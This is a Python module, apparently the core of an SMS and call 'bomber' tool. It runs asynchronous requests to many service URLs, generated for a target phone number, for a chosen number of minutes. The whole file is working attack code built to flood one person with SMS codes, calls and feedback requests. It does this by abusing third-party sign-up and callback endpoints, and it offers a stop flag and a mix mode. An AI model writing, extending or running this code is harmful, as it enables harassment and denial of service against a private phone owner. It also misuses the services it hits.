from asyncio import ensure_future, gather, run, Event
from aiohttp import ClientSession

from Core.Attack.Services import urls
from Core.Attack.Feedback_Services import feedback_urls
from Core.Config import check_config

# Глобальный флаг для остановки атак
stop_event = Event()

async def request(session, url):
    try:
        if stop_event.is_set():
            return

        type_attack = ('SMS', 'CALL', 'FEEDBACK') if check_config()['type_attack'] == 'MIX' else check_config()['type_attack']

        if url['info']['attack'] in type_attack:
            async with session.request(
                url['method'],
                url['url'],
                params=url.get('params'),
                cookies=url.get('cookies'),
                headers=url.get('headers'),
                data=url.get('data'),
                json=url.get('json'),
                timeout=20
            ) as response:
                return await response.text()
    except:
        pass

async def async_attacks(number):
    async with ClientSession() as session:
        services = (urls(number) + feedback_urls(number)) if check_config()['feedback'] == 'True' else urls(number)
        tasks = [ensure_future(request(session, service)) for service in services]
        await gather(*tasks)

def start_async_attacks(number, minutes):
    import time
    start_time = time.time()
    duration = float(minutes) * 60
    while True:
        if stop_event.is_set():
            break
        elapsed = time.time() - start_time
        if elapsed >= duration:
            break
        run(async_attacks(number))

def stop_attacks():
    stop_event.set()